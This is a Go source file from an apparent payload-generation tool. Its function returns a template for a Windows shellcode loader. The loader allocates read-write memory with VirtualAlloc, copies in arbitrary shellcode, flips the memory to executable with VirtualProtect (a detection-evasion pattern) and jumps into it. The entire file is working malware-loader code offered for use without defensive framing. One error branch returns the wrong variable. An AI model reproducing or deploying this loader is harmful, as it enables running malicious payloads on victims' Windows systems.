package loaders

import (
	"fmt"
)

func GetSyscallTemplate() string {
	return fmt.Sprintf(`
package main

import (
    "errors"
    "syscall"
    "unsafe"
)

func ExecuteOrderSixtySix(shellcode []byte) (error) {

    MEM_COMMIT := 0x1000
    MEM_RESERVE := 0x2000
    PAGE_EXECUTE_READ := 0x20
    PAGE_READWRITE := 0x04

    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    ntdll := syscall.MustLoadDLL("ntdll.dll")

    VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
    VirtualProtect := kernel32.MustFindProc("VirtualProtect")
    RtlCopyMemory := ntdll.MustFindProc("RtlCopyMemory")

    addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
        return errVirtualAlloc
    }

    if addr == 0 {
        return errors.New("[!]VirtualAlloc failed and returned 0")
    }

    _, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
        return errRtlCopyMemory
    }

    oldProtect := PAGE_READWRITE
    _, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
    if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
        return errVirtualAlloc
    }
    _, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

    if errSyscall != 0 {
        return errSyscall
    }

    return nil
}
    `)
}
